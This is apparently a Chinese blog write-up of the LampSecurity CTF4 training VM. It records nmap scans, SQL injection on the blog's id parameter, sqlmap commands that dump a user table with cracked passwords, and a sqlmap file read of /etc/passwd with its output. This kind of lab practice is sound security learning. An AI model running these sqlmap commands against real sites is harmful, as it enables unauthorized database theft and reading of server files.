---
icon: pen-to-square
date: 2025-08-13
title: LampSecurityCTF4
tags: 
category:
  - 项目
---
## 信息收集
开启虚拟机，NAT，扫描对应C段，发现主机
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 22:58 CST
Nmap scan report for 192.168.254.1
Host is up (0.00038s latency).
Nmap scan report for 192.168.254.145
Host is up (0.00046s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 16.88 seconds
```
详细信息扫描
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 23:18 CST
Nmap scan report for 192.168.254.145
Host is up (0.00095s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.254.1], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
|_http-server-header: Apache/2.2.0 (Fedora)
| http-robots.txt: 5 disallowed entries
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-title:  Prof. Ehks
631/tcp closed ipp
Device type: general purpose|remote management|webcam|terminal server|proxy server|switch|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X (96%), Control4 embedded (94%), Mobotix embedded (94%), Lantronix embedded (94%), SonicWALL embedded (93%), SNR embedded (93%), Dell iDRAC 6 (92%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:lantronix:slc_8 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:snr:snr-s2960 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10
Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (96%), Linux 2.6.13 - 2.6.32 (95%), Control4 HC-300 home controller or Mobotix M22 camera (94%), Lantronix SLC 8 terminal server (Linux 2.6) (94%), SonicWALL Aventail EX-6000 VPN appliance (93%), SNR SNR-S2960 switch (93%), Linux 2.6.8 - 2.6.30 (92%), Linux 2.6.23 (92%), Linux 2.6.9 - 2.6.18 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds

```

## 在blog界面的url发现sql注入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250816002316.png)
由于是PHP报错，所以不会返回报错信息，那么可以使用布尔盲注，配合`bp`得到数据库名`ehks`
下面转入sqlmap操作
### sqlmap一路脱库
不得不赞叹`sqlmap`真是太nb了
```bash
sqlmap --batch -D ehks -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" -p id
初步对接sqlmap

sqlmap -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" --tables -D ehks
拖表

+---------+
| comment |
| user    |
| blog    |
+---------+

sqlmap -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" --dump -D ehks -T user
脱user表
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```
是真66666

直接利用sql注入读取文件
```bash
sqlmap -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" --file-read="/etc/passwd"
```

```bash
┌──(root㉿localhost)-[~]
└─# cat /root/.local/share/sqlmap/output/192.168.254.145/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
distcache:x:94:94:Distcache:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
pcap:x:77:77::/var/arpwatch:/sbin/nologin
avahi:x:70:70:Avahi daemon:/:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
gdm:x:42:42::/var/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
dstevens:x:500:506:Don Stevens:/home/dstevens:/bin/bash
achen:x:501:501:Andrew Chen:/home/achen:/bin/bash
pmoore:x:502:502:Phillip Moore:/home/pmoore:/bin/bash
jdurbin:x:503:503:James Durbin:/home/jdurbin:/bin/bash
sorzek:x:504:504:Sally Orzek:/home/sorzek:/bin/bash
ghighland:x:505:505:Greg Highland:/home/ghighland:/bin/bash
ossec:x:506:508::/var/ossec:/sbin/nologin
ossecm:x:507:508::/var/ossec:/sbin/nologin
ossecr:x:508:508::/var/ossec:/sbin/nologin
```